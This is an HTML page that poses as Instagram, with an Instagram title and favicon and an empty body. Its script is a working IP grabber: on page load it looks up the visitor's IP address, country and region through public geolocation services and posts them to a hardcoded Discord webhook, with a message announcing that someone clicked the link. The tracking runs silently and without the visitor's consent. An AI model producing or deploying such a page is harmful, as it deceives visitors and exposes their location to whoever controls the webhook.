<!DOCTYPE html>
<html lang="fr">
<head>
  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
  <title>Instagram</title>
  <script>
    // Fonction pour envoyer l'adresse IP, le pays et le d√©partement √† Discord via un appel de webhook
    function sendIPCountryAndDepartmentToDiscord(ipAddress, country, department) {
      var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";

      var content = "> **Quelqu'un vient de cliquer sur le lien. Voici ses informations :**" +
        "\n> **Adresse IP üõ∞Ô∏è : **" + ipAddress +
        "\n> **Pays üåç : **" + country +
        "\n> **D√©partement üè† : **" + department;

      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: content
      };
      request.send(JSON.stringify(params));
    }

    // Fonction pour r√©cup√©rer l'adresse IP, le pays et le d√©partement de l'utilisateur
    function getIPAddressCountryAndDepartment() {
      // R√©cup√©rer l'adresse IP de l'utilisateur en utilisant un service de g√©olocalisation
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ipAddress = data.ip;

          // R√©cup√©rer le pays et le d√©partement en fonction de l'adresse IP
          fetch('http://ip-api.com/json/' + ipAddress)
            .then(response => response.json())
            .then(data => {
              var country = data.country; // Nom du pays
              var department = data.regionName; // Nom du d√©partement

              // Envoyer l'adresse IP, le pays et le d√©partement √† Discord
              sendIPCountryAndDepartmentToDiscord(ipAddress, country, department);
            })
            .catch(error => {
              console.error('Erreur lors de la r√©cup√©ration du pays et du d√©partement :', error);
            });
        })
        .catch(error => {
          console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP :', error);
        });
    }

    // Appeler la fonction d√®s que la page est charg√©e
    window.addEventListener('load', getIPAddressCountryAndDepartment);
  </script>
</head>
<body>
</body>
</html>
